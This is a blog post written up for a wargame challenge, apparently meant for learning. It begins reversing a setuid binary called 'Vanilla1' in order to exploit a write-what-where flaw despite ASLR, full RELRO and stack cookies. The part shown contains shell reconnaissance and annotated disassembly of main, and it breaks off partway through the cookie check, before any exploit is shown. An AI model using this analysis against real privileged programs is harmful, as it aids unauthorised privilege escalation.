<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Vanilla1 : write-what-where exploitation (ASLR, Full RELRO, Stack cookie)</title>
  <meta name="description" content="Hello,">

  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="canonical" href="/binholic/2013/06/10/vanilla1-write-what-where-exploitation.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Vanilla1 : write-what-where exploitation (ASLR, Full RELRO, Stack cookie)</h1>
    <p class="post-meta"><time datetime="2013-06-10T14:56:00+02:00" itemprop="datePublished">Jun 10, 2013</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>Hello,</p>

<p>For today article, we’re going to analyze and exploit a write-what-where with
ASLR, no PIE, full RELRO and stack cookie.</p>

<p>This is part of a set of challenges made by sm0k: <a href="http://www.sm0k.org/dojo/vanilla.php">Vanilla Dome Wargame</a>.</p>

<p>Let’s begin.</p>

<h1 id="the-challenge">The challenge</h1>

<p>Before any reversing attempt, we need to launch the program to see what it does.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="code"><pre>vanilla1@VanillaDome ~ <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lash</span>
total 76K
4.0K drwxr-xr-x  2 root          root          4.0K Apr 29 14:15 <span class="nb">.</span>
4.0K drwxr-x--x 10 root          root          4.0K May 15 20:52 ..
4.0K <span class="nt">-rw-r--r--</span>  1 root          root           127 Mar 23 05:56 .bash_logout
4.0K <span class="nt">-rw-r--r--</span>  1 root          root           193 Mar 23 05:56 .bash_profile
4.0K <span class="nt">-rw-r--r--</span>  1 root          root          3.9K Apr 29 15:47 .bashrc
 44K <span class="nt">-rw-r--r--</span>  1 root          root           44K Apr 29 14:15 .gdbinit
8.0K <span class="nt">-r-sr-sr-x</span>  1 vanilla1crack vanilla1crack 6.7K Apr 29 12:28 Vanilla1
4.0K <span class="nt">-r--------</span>  1 vanilla1crack vanilla1crack   19 Apr 29 12:28 key
vanilla1@VanillaDome ~ <span class="nv">$ </span>./Vanilla1 
     Usage:./Vanilla1 &lt;file&gt;
vanilla1@VanillaDome ~ <span class="nv">$ </span>./Vanilla1 key
vanilla1@VanillaDome ~ <span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "a" * 1024'</span> <span class="o">&gt;</span> /tmp/file.txt
vanilla1@VanillaDome ~ <span class="nv">$ </span>./Vanilla1 /tmp/file.txt
</pre></td></tr></tbody></table></code></pre></figure>

<p>Ok, it basically read some file and do stuffs with it …</p>

<h1 id="lets-reverse-it">Let’s reverse it</h1>

<p>Opening GDB and disassembling main we get the following:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre></td><td class="code"><pre><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">main</span><span class="p">:</span>
   <span class="err">0</span><span class="nf">x08048578</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="nb">ebp</span>
   <span class="err">0</span><span class="nf">x08048579</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="nb">esp</span>
   <span class="err">0</span><span class="nf">x0804857b</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">and</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>                   <span class="c1">; alignment</span>
   <span class="err">0</span><span class="nf">x0804857e</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x1050</span>                       <span class="c1">; there is a HUGE buffer and we have ebp = esp + 0x1050</span>
   <span class="err">0</span><span class="nf">x08048584</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>          <span class="c1">; argc</span>
   <span class="err">0</span><span class="nf">x08048587</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">],</span><span class="nb">eax</span>         <span class="c1">; n_arg = argc</span>
   <span class="err">0</span><span class="nf">x0804858b</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>          <span class="c1">; argv</span>
   <span class="err">0</span><span class="nf">x0804858e</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="nb">eax</span>         <span class="c1">; args = argv</span>
   <span class="err">0</span><span class="nf">x08048592</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>                      <span class="c1">; eax = stack cookie</span>
   <span class="err">0</span><span class="nf">x08048598</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x104c</span><span class="p">],</span><span class="nb">eax</span>       <span class="c1">; stack cookie (stored in gs:0x14)</span>
   <span class="err">0</span><span class="nf">x0804859f</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x080485a1</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">],</span><span class="mh">0x1</span>         <span class="c1">; if (n_arg &lt;= 1) then error</span>
   <span class="err">0</span><span class="nf">x080485a6</span> <span class="o">&lt;+</span><span class="mi">46</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">jg</span>     <span class="mh">0x80485c4</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span>              <span class="c1">; else continue</span>

   <span class="err">0</span><span class="nf">x080485a8</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>         <span class="c1">; args ptr</span>
   <span class="err">0</span><span class="nf">x080485ac</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>              <span class="c1">; program name</span>
   <span class="err">0</span><span class="nf">x080485ae</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x8048790</span>                    <span class="c1">; format = "\t Usage:%s &lt;file&gt;\n"</span>
   <span class="c1">; printf ("\t Usage:%s &lt;file&gt;\n", argv[0]);</span>
   <span class="err">0</span><span class="nf">x080485b3</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">edx</span>
   <span class="err">0</span><span class="nf">x080485b7</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x080485ba</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x8048434</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x080485bf</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">jmp</span>    <span class="mh">0x80486a9</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">305</span><span class="o">&gt;</span>          <span class="c1">; bye</span>

   <span class="c1">; memset (esp+0x38, 0x0, 0x1000);</span>
   <span class="err">0</span><span class="nf">x080485c4</span> <span class="o">&lt;+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x34</span><span class="p">],</span><span class="mh">0x0</span>         <span class="c1">; fp = NULL;</span>
   <span class="err">0</span><span class="nf">x080485cc</span> <span class="o">&lt;+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0x1000</span>
   <span class="err">0</span><span class="nf">x080485d4</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x080485dc</span> <span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x38</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x080485e0</span> <span class="o">&lt;+</span><span class="mi">104</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x080485e3</span> <span class="o">&lt;+</span><span class="mi">107</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x80483f4</span> <span class="o">&lt;</span><span class="nv">memset@plt</span><span class="o">&gt;</span>

   <span class="c1">; fp = fopen (argv[1], "r");</span>
   <span class="err">0</span><span class="nf">x080485e8</span> <span class="o">&lt;+</span><span class="mi">112</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="mh">0x80487a3</span>                    <span class="c1">; "r"</span>
   <span class="err">0</span><span class="nf">x080485ed</span> <span class="o">&lt;+</span><span class="mi">117</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>         <span class="c1">; args</span>
   <span class="err">0</span><span class="nf">x080485f1</span> <span class="o">&lt;+</span><span class="mi">121</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">add</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x4</span>
   <span class="err">0</span><span class="nf">x080485f4</span> <span class="o">&lt;+</span><span class="mi">124</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>              <span class="c1">; eax = args[1];</span>
   <span class="err">0</span><span class="nf">x080485f6</span> <span class="o">&lt;+</span><span class="mi">126</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">edx</span>
   <span class="err">0</span><span class="nf">x080485fa</span> <span class="o">&lt;+</span><span class="mi">130</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x080485fd</span> <span class="o">&lt;+</span><span class="mi">133</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x8048424</span> <span class="o">&lt;</span><span class="nv">fopen@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048602</span> <span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x34</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048606</span> <span class="o">&lt;+</span><span class="mi">142</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x34</span><span class="p">],</span><span class="mh">0x0</span>         <span class="c1">; if (fp == NULL) then error</span>
   <span class="err">0</span><span class="nf">x0804860b</span> <span class="o">&lt;+</span><span class="mi">147</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">je</span>     <span class="mh">0x80486a9</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">305</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048611</span> <span class="o">&lt;+</span><span class="mi">153</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">jmp</span>    <span class="mh">0x8048682</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">266</span><span class="o">&gt;</span>          <span class="c1">; else fgets</span>

   <span class="c1">; value1 = atoll (buffer);</span>
   <span class="err">0</span><span class="nf">x08048613</span> <span class="o">&lt;+</span><span class="mi">155</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x1038</span><span class="p">]</span>                 <span class="c1">; this is a small buffer (ebp-0x1050+0x1038 = ebp-0x18)</span>
   <span class="err">0</span><span class="nf">x0804861a</span> <span class="o">&lt;+</span><span class="mi">162</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804861d</span> <span class="o">&lt;+</span><span class="mi">165</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x8048414</span> <span class="o">&lt;</span><span class="nv">atoll@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048622</span> <span class="o">&lt;+</span><span class="mi">170</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">],</span><span class="nb">eax</span>
   <span class="c1">; fgets (sbuffer, 0x14, fp);</span>
   <span class="err">0</span><span class="nf">x08048626</span> <span class="o">&lt;+</span><span class="mi">174</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x34</span><span class="p">]</span>         <span class="c1">; eax = fp</span>
   <span class="err">0</span><span class="nf">x0804862a</span> <span class="o">&lt;+</span><span class="mi">178</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804862e</span> <span class="o">&lt;+</span><span class="mi">182</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x14</span>
   <span class="err">0</span><span class="nf">x08048636</span> <span class="o">&lt;+</span><span class="mi">190</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x1038</span><span class="p">]</span>                 <span class="c1">; sbuffer</span>
   <span class="err">0</span><span class="nf">x0804863d</span> <span class="o">&lt;+</span><span class="mi">197</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048640</span> <span class="o">&lt;+</span><span class="mi">200</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x80483e4</span> <span class="o">&lt;</span><span class="nv">fgets@plt</span><span class="o">&gt;</span>
   <span class="c1">; value2 = atoll(sbuffer);</span>
   <span class="err">0</span><span class="nf">x08048645</span> <span class="o">&lt;+</span><span class="mi">205</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x1038</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x0804864c</span> <span class="o">&lt;+</span><span class="mi">212</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804864f</span> <span class="o">&lt;+</span><span class="mi">215</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x8048414</span> <span class="o">&lt;</span><span class="nv">atoll@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x08048654</span> <span class="o">&lt;+</span><span class="mi">220</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x2c</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048658</span> <span class="o">&lt;+</span><span class="mi">224</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">],</span><span class="mh">0x0</span>         <span class="c1">; if (value1 == 0) then fgets</span>
   <span class="err">0</span><span class="nf">x0804865d</span> <span class="o">&lt;+</span><span class="mi">229</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">je</span>     <span class="mh">0x8048682</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">266</span><span class="o">&gt;</span>

   <span class="err">0</span><span class="nf">x0804865f</span> <span class="o">&lt;+</span><span class="mi">231</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">cmp</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x2c</span><span class="p">],</span><span class="mh">0x0</span>         <span class="c1">; if (value2 == 0) then fgets</span>
   <span class="err">0</span><span class="nf">x08048664</span> <span class="o">&lt;+</span><span class="mi">236</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">je</span>     <span class="mh">0x8048682</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">266</span><span class="o">&gt;</span>

   <span class="c1">; insert (value2, value1, esp+0x38);</span>
   <span class="err">0</span><span class="nf">x08048666</span> <span class="o">&lt;+</span><span class="mi">238</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x38</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x0804866a</span> <span class="o">&lt;+</span><span class="mi">242</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804866e</span> <span class="o">&lt;+</span><span class="mi">246</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">]</span>         <span class="c1">; eax = value1</span>
   <span class="err">0</span><span class="nf">x08048672</span> <span class="o">&lt;+</span><span class="mi">250</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x08048676</span> <span class="o">&lt;+</span><span class="mi">254</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x2c</span><span class="p">]</span>         <span class="c1">; eax = value2</span>
   <span class="err">0</span><span class="nf">x0804867a</span> <span class="o">&lt;+</span><span class="mi">258</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804867d</span> <span class="o">&lt;+</span><span class="mi">261</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x8048534</span> <span class="o">&lt;</span><span class="nv">insert</span><span class="o">&gt;</span>

   <span class="c1">; fgets (buffer, 0x14, fp);</span>
   <span class="err">0</span><span class="nf">x08048682</span> <span class="o">&lt;+</span><span class="mi">266</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x34</span><span class="p">]</span>         <span class="c1">; eax = fp</span>
   <span class="err">0</span><span class="nf">x08048686</span> <span class="o">&lt;+</span><span class="mi">270</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804868a</span> <span class="o">&lt;+</span><span class="mi">274</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x14</span>
   <span class="err">0</span><span class="nf">x08048692</span> <span class="o">&lt;+</span><span class="mi">282</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">lea</span>    <span class="nb">eax</span><span class="p">,[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x1038</span><span class="p">]</span>                 <span class="c1">; buffer</span>
   <span class="err">0</span><span class="nf">x08048699</span> <span class="o">&lt;+</span><span class="mi">289</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
   <span class="err">0</span><span class="nf">x0804869c</span> <span class="o">&lt;+</span><span class="mi">292</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">call</span>   <span class="mh">0x80483e4</span> <span class="o">&lt;</span><span class="nv">fgets@plt</span><span class="o">&gt;</span>
   <span class="err">0</span><span class="nf">x080486a1</span> <span class="o">&lt;+</span><span class="mi">297</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">test</span>   <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>                          <span class="c1">; if (still data) then loop</span>
   <span class="err">0</span><span class="nf">x080486a3</span> <span class="o">&lt;+</span><span class="mi">299</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">jne</span>    <span class="mh">0x8048613</span> <span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">155</span><span class="o">&gt;</span>

   <span class="c1">; check cookie</span>
   <span class="err">0</span><span class="nf">x080486a9</span> <span class="o">&lt;+</span><span class="mi">305</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="err">0</span><span class="nf">x080486ae</span> <span class="o">&lt;+</span><span class="mi">310</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x104c</span><span class="p">]</span>       <span class="c1">; stack cookie</span>
   <span class="err">0</span><span class="nf">x080486b5</span> <span class="o">&lt;+</span><span class="mi">317</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="nb">gs</span><span class="p">:</span><span class="mh">0x14</span>
